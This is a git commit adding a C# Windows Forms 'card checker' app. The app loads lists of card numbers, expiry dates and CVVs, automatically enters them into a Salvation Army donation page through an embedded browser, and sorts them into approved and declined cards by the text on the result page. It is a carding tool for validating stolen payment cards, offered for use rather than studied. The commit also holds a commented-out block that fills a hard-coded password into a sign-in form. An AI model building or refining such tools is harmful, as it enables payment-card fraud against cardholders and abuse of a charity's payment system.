44b933c097817950adb707ae2790b0ce89fb1d06
frontierdavid <31594328+frontierdavid@users.noreply.github.com>
2019-02-09 15:56:53 -0500

    need help

---
+++ FrontierChecker/FrontierChecker/Form1.Designer.cs
@@ -0,0 +1,346 @@
+﻿namespace FrontierChecker
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variable del diseñador necesaria.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Limpiar los recursos que se estén usando.
+        /// </summary>
+        /// <param name="disposing">true si los recursos administrados se deben desechar; false en caso contrario.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Código generado por el Diseñador de Windows Forms
+
+        /// <summary>
+        /// Método necesario para admitir el Diseñador. No se puede modificar
+        /// el contenido de este método con el editor de código.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.lblAprovadas = new System.Windows.Forms.Label();
+            this.lblReprovadas = new System.Windows.Forms.Label();
+            this.lblStatus = new System.Windows.Forms.Label();
+            this.geckoWebBrowser1 = new Gecko.GeckoWebBrowser();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.timer3 = new System.Windows.Forms.Timer(this.components);
+            this.timer4 = new System.Windows.Forms.Timer(this.components);
+            this.timer5 = new System.Windows.Forms.Timer(this.components);
+            this.tContador = new System.Windows.Forms.Timer(this.components);
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.Aprovadas = new System.Windows.Forms.ListBox();
+            this.Reprovadas = new System.Windows.Forms.ListBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.txtDirectorio = new System.Windows.Forms.TextBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.dataGridView1 = new System.Windows.Forms.DataGridView();
+            this.button4 = new System.Windows.Forms.Button();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.lblContador = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(12, 43);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Open";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(12, 72);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "Start";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(13, 102);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 2;
+            this.button3.Text = "Stop";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(28, 178);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(40, 13);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "Status:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(245, 43);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(61, 13);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Aprovadas;";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(245, 219);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(68, 13);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Reprovadas:";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(163, 178);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(0, 13);
+            this.label4.TabIndex = 6;
+            // 
+            // lblAprovadas
+            // 
+            this.lblAprovadas.AutoSize = true;
+            this.lblAprovadas.Location = new System.Drawing.Point(380, 43);
+            this.lblAprovadas.Name = "lblAprovadas";
+            this.lblAprovadas.Size = new System.Drawing.Size(25, 13);
+            this.lblAprovadas.TabIndex = 7;
+            this.lblAprovadas.Text = "000";
+            // 
+            // lblReprovadas
+            // 
+            this.lblReprovadas.AutoSize = true;
+            this.lblReprovadas.Location = new System.Drawing.Point(380, 219);
+            this.lblReprovadas.Name = "lblReprovadas";
+            this.lblReprovadas.Size = new System.Drawing.Size(25, 13);
+            this.lblReprovadas.TabIndex = 8;
+            this.lblReprovadas.Text = "000";
+            // 
+            // lblStatus
+            // 
+            this.lblStatus.AutoSize = true;
+            this.lblStatus.Location = new System.Drawing.Point(132, 178);
+            this.lblStatus.Name = "lblStatus";
+            this.lblStatus.Size = new System.Drawing.Size(65, 13);
+            this.lblStatus.TabIndex = 9;
+            this.lblStatus.Text = "En Espera...";
+            // 
+            // geckoWebBrowser1
+            // 
+            this.geckoWebBrowser1.FrameEventsPropagateToMainWindow = false;
+            this.geckoWebBrowser1.Location = new System.Drawing.Point(592, 57);
+            this.geckoWebBrowser1.Name = "geckoWebBrowser1";
+            this.geckoWebBrowser1.Size = new System.Drawing.Size(485, 312);
+            this.geckoWebBrowser1.TabIndex = 10;
+            this.geckoWebBrowser1.UseHttpActivityObserver = false;
+            // 
+            // timer1
+            // 
+            this.timer1.Interval = 2000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // timer2
+            // 
+            this.timer2.Interval = 2000;
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
+            // 
+            // timer3
+            // 
+            this.timer3.Interval = 2000;
+            this.timer3.Tick += new System.EventHandler(this.timer3_Tick);
+            // 
+            // timer4
+            // 
+            this.timer4.Interval = 99999;
+            this.timer4.Tick += new System.EventHandler(this.timer4_Tick);
+            // 
+            // timer5
+            // 
+            this.timer5.Interval = 7000;
+            this.timer5.Tick += new System.EventHandler(this.timer5_Tick);
+            // 
+            // tContador
+            // 
+            this.tContador.Tick += new System.EventHandler(this.tContador_Tick);
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
+            // 
+            // Aprovadas
+            // 
+            this.Aprovadas.FormattingEnabled = true;
+            this.Aprovadas.Location = new System.Drawing.Point(248, 57);
+            this.Aprovadas.Name = "Aprovadas";
+            this.Aprovadas.Size = new System.Drawing.Size(322, 134);
+            this.Aprovadas.TabIndex = 12;
+            this.Aprovadas.SelectedIndexChanged += new System.EventHandler(this.listBox1_SelectedIndexChanged);
+            // 
+            // Reprovadas
+            // 
+            this.Reprovadas.FormattingEnabled = true;
+            this.Reprovadas.Location = new System.Drawing.Point(248, 235);
+            this.Reprovadas.Name = "Reprovadas";
+            this.Reprovadas.Size = new System.Drawing.Size(322, 134);
+            this.Reprovadas.TabIndex = 13;
+            this.Reprovadas.SelectedIndexChanged += new System.EventHandler(this.Reprovadas_SelectedIndexChanged);
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(27, 12);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(25, 20);
+            this.textBox2.TabIndex = 14;
+            this.textBox2.Visible = false;
+            // 
+            // txtDirectorio
+            // 
+            this.txtDirectorio.Location = new System.Drawing.Point(58, 12);
+            this.txtDirectorio.Name = "txtDirectorio";
+            this.txtDirectorio.Size = new System.Drawing.Size(25, 20);
+            this.txtDirectorio.TabIndex = 15;
+            this.txtDirectorio.Visible = false;
+            this.txtDirectorio.TextChanged += new System.EventHandler(this.txtDirectorio_TextChanged);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(89, 12);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(25, 20);
+            this.textBox3.TabIndex = 16;
+            this.textBox3.Visible = false;
+            // 
+            // dataGridView1
+            // 
+            this.dataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
+            this.dataGridView1.Location = new System.Drawing.Point(27, 219);
+            this.dataGridView1.Name = "dataGridView1";
+            this.dataGridView1.Size = new System.Drawing.Size(212, 150);
+            this.dataGridView1.TabIndex = 17;
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(123, 72);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(75, 23);
+            this.button4.TabIndex = 18;
+            this.button4.Text = "Clear";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.Text = "notifyIcon1";
+            this.notifyIcon1.Visible = true;
+            // 
+            // lblContador
+            // 
+            this.lblContador.AutoSize = true;
+            this.lblContador.Location = new System.Drawing.Point(135, 139);
+            this.lblContador.Name = "lblContador";
+            this.lblContador.Size = new System.Drawing.Size(25, 13);
+            this.lblContador.TabIndex = 19;
+            this.lblContador.Text = "000";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(13, 165);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(100, 20);
+            this.textBox1.TabIndex = 20;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1110, 541);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.lblContador);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.dataGridView1);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.txtDirectorio);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.Reprovadas);
+            this.Controls.Add(this.Aprovadas);
+            this.Controls.Add(this.geckoWebBrowser1);
+            this.Controls.Add(this.lblStatus);
+            this.Controls.Add(this.lblReprovadas);
+            this.Controls.Add(this.lblAprovadas);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label lblAprovadas;
+        private System.Windows.Forms.Label lblReprovadas;
+        private System.Windows.Forms.Label lblStatus;
+        private Gecko.GeckoWebBrowser geckoWebBrowser1;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Timer timer2;
+        private System.Windows.Forms.Timer timer3;
+        private System.Windows.Forms.Timer timer4;
+        private System.Windows.Forms.Timer timer5;
+        private System.Windows.Forms.Timer tContador;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.ListBox Aprovadas;
+        private System.Windows.Forms.ListBox Reprovadas;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.TextBox txtDirectorio;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.DataGridView dataGridView1;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.Label lblContador;
+        private System.Windows.Forms.TextBox textBox1;
+    }
+}
+
---
+++ FrontierChecker/FrontierChecker/Form1.cs
@@ -0,0 +1,333 @@
+﻿using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Collections.Specialized;
+using System.Data.SqlClient;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Net;
+using System.Net.Mail;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.CompilerServices;
+using System.Threading;
+using Gecko;
+
+
+
+namespace FrontierChecker
+{
+    public partial class Form1 : Form
+    {
+        private String strMailBody { get; set; }
+        private String sIP { get; set; } 
+        private String bin { get; set; }
+
+        private string ar;
+
+        private void f()
+        {
+            this.dataGridView1.Rows.Remove(this.dataGridView1.Rows[0]);
+        }
+        private object Tarjetas()
+        {
+            throw new NotImplementedException();
+        }
+    public object borrarPrimeraLinea(string Archivo)
+        {
+            object obj2 = new object() ;
+            try
+            {
+                int num2;
+                StreamReader reader = new StreamReader(Archivo);
+                string[] strArray = new string[2];
+                int index = 0;
+                do
+                {
+                    strArray[index] = reader.ReadLine();
+                    index += 1;
+                    num2 = 1;
+                }
+                while (index <= num2);
+                {
+                    this.textBox3.Text = strArray[0];
+                    List<string> list = new List<string>(File.ReadAllLines(Archivo));
+                    list.RemoveAt(0);
+                    reader.Dispose();
+                    reader.Close();
+                    File.WriteAllLines(Archivo, list.ToArray());
+                }
+            }
+            catch
+            {
+
+            }
+            return obj2;
+        }
+        public Form1()
+
+        {
+         
+            InitializeComponent();
+            Xpcom.Initialize("Firefox");
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            geckoWebBrowser1.Navigate("https://secure20.salvationarmy.org/donation.jsp");
+  
+            timer1.Start();
+            lblStatus.Text = "Verificando Lista";
+            lblStatus.ForeColor = Color.Lime;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //ABRIR
+            openFileDialog1.ShowDialog();
+            txtDirectorio.Text = openFileDialog1.FileName;
+            try
+            {
+                // =========================================================
+                char Separador;
+                DataTable datagrid = new DataTable();
+                DataRow dr;
+                //==========================================================
+                lblStatus.Text = "Carga Correcta....";
+                lblStatus.ForeColor = Color.Gold;
+
+                datagrid.Columns.Add("CC");
+                datagrid.Columns.Add("MES");
+                datagrid.Columns.Add("ANO");
+                datagrid.Columns.Add("CVV");
+                dr = datagrid.NewRow();
+                //=============================================================
+                System.IO.StreamReader Archivo = new System.IO.StreamReader(txtDirectorio.Text);
+                Separador = Convert.ToChar("|");
+                while (Archivo.Peek() != -1)
+                {
+                    datagrid.Rows.Add(Archivo.ReadLine().Split(Separador));
+                    
+                }
+                dataGridView1.DataSource = datagrid;
+                this.Tarjetas();
+                dataGridView1.CurrentRow.Selected = true;
+                // =============================================================
+            }
+            catch(Exception)
+            {
+
+            }
+            this.tContador.Start();
+            //ORGANIZADOR GRID
+            int tmn;
+            var loopTo = dataGridView1.ColumnCount - 1;
+            for (tmn = 0; tmn <= loopTo - 1; tmn++)
+            {
+                if(tmn == dataGridView1.ColumnCount - 1)
+                {
+                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
+                }
+                else
+                {
+                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
+                }
+              
+            }
+        }
+
+        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            //DETENER
+            lblStatus.Text = "Pausado...";
+        lblStatus.ForeColor = Color.Red;
+            timer1.Stop();
+            timer2.Stop();
+            timer3.Stop();
+            timer4.Stop();
+            timer5.Stop();
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            //LIMPIAR
+            dataGridView1.DataSource = null;
+            dataGridView1.Rows.Clear();
+            dataGridView1.Refresh();
+            Aprovadas.Items.Clear();
+            Reprovadas.Items.Clear();
+            txtDirectorio.Text = "";
+            lblStatus.Text = "";
+            lblAprovadas.Text = "";
+            lblReprovadas.Text = "";
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            //COMENZAR A TESTEAR
+            lblStatus.Text = "Testeando...";
+            lblStatus.ForeColor = Color.Lime;
+            timer2.Start();
+            timer1.Stop();
+        }
+
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+          
+            //TIMER 2 TESTEANDO
+            if (true)
+            {
+                try
+                {
+                    this.lblStatus.Text = "Testeando";
+                    this.lblStatus.Text = "Testeando...";
+                    lblStatus.ForeColor = Color.Lime;
+                    this.dataGridView1.CurrentRow.Selected = true;
+                    //DATOS DEL GATE
+             
+                    geckoWebBrowser1.Document.GetElementById("cardNumber").SetAttribute("value", Convert.ToString(this.dataGridView1.CurrentRow.Cells[0].Value));
+
+                    geckoWebBrowser1.Document.GetElementById("cardCvc").SetAttribute("value", Convert.ToString(this.dataGridView1.CurrentRow.Cells[2].Value));
+
+                    //TIMERS
+                    this.timer2.Stop();
+                    timer5.Start();     
+                }
+                catch(Exception exception1)
+                {
+                    Console.WriteLine("A OCURRIDO UN ERROR", exception1);
+                
+                }
+            }
+        }
+
+        private void timer3_Tick(object sender, EventArgs e)
+        {
+            timer4.Start();
+            try
+            {
+               
+            
+      
+                if (geckoWebBrowser1.Document.Body.InnerHtml.Contains("<a>Gift Cards</a>")) 
+                {
+                    this.Aprovadas.Items.Add("FRONTIER CHECKER" + this.dataGridView1.CurrentRow.Cells[0].Value + "|" + this.dataGridView1.CurrentRow.Cells[1].Value + "|" + this.dataGridView1.CurrentRow.Cells[2].Value + "|" + this.dataGridView1.CurrentRow.Cells[3].Value + "SE DEBITO 1 $ NICE");
+                    this.geckoWebBrowser1.Navigate("https://www.google.com/");
+                    lblStatus.Text = "Aprovada";
+                    notifyIcon1.Visible = true;
+                    lblStatus.ForeColor = Color.SpringGreen;
+                    lblAprovadas.Text = Aprovadas.Items.Count.ToString();
+                    this.f();
+                    this.borrarPrimeraLinea(this.ar);
+                    timer3.Stop();
+                    timer1.Start();
+                    timer4.Stop();
+                }
+                else if (geckoWebBrowser1.Document.Body.InnerHtml.Contains("Hello") )
+                {
+                    this.Reprovadas.Items.Add("FRONTIER CHECKER" + this.dataGridView1.CurrentRow.Cells[0].Value + "|" + this.dataGridView1.CurrentRow.Cells[1].Value + "|" + this.dataGridView1.CurrentRow.Cells[2].Value + "|" + this.dataGridView1.CurrentRow.Cells[3].Value + "NO SE DEBITO");
+                    lblStatus.Text = "Reprovada";
+                    this.geckoWebBrowser1.Navigate("https://www.google.com/");
+                    lblStatus.ForeColor = Color.Red;
+                    lblReprovadas.Text = Reprovadas.Items.Count.ToString();
+                    this.f();
+                    this.borrarPrimeraLinea(this.ar);
+                    timer3.Stop();
+                    timer1.Start();
+                    timer4.Stop();
+                }
+            }
+            catch 
+            {
+
+            }
+            
+        }
+
+        private void timer4_Tick(object sender, EventArgs e)
+        {
+            this.geckoWebBrowser1.Navigate("google.com");
+            lblStatus.Text = "Tiempo Expirado..";
+            lblStatus.ForeColor = Color.Red;
+            timer1.Start();
+            timer4.Stop();
+        }
+
+        private void timer5_Tick(object sender, EventArgs e)
+        {
+            timer3.Start();
+            lblStatus.Text = Convert.ToString(this.dataGridView1.CurrentRow.Cells[0].Value);
+            lblStatus.ForeColor = Color.Gold;
+            //////////////////////////////////// SEGUNDA PAGGINA GATEWAY 
+            //var password = new Gecko.DOM.GeckoInputElement(geckoWebBrowser1.Document.GetHtmlElementById("ap_password").DomObject);
+           //password.Value = @"loquendo123";
+
+            //var clicButton = new Gecko.DOM.GeckoInputElement(geckoWebBrowser1.Document.GetHtmlElementById("signInSubmit").DomObject);
+            //clicButton.Click();
+
+            ////////////////////////////////////////////////////////
+            timer5.Stop();
+        }
+
+        private void tContador_Tick(object sender, EventArgs e)
+        {
+            int suma = 0;
+            try
+            {
+                var loopTo = dataGridView1.RowCount - 1;
+                for (int i = 0; i <= loopTo; i++)
+                {
+                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex)) 
+                    {
+                        suma+=1;
+                    }
+
+                }
+
+                this.lblContador.Text = Convert.ToString(suma);
+            }
+            catch (Exception )
+            {
+                lblContador.Text = "0";
+            }
+
+            if ((lblContador.Text == "1"))
+            {
+                lblContador.Text = "0";
+                this.tContador.Stop();
+                this.timer1.Stop();
+                this.timer2.Stop();
+                this.timer3.Stop();
+                lblStatus.Text = "Teste Finalizado !";
+                lblStatus.ForeColor = Color.Gray;
+                 
+            }
+        }
+
+        private void txtDirectorio_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Reprovadas_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
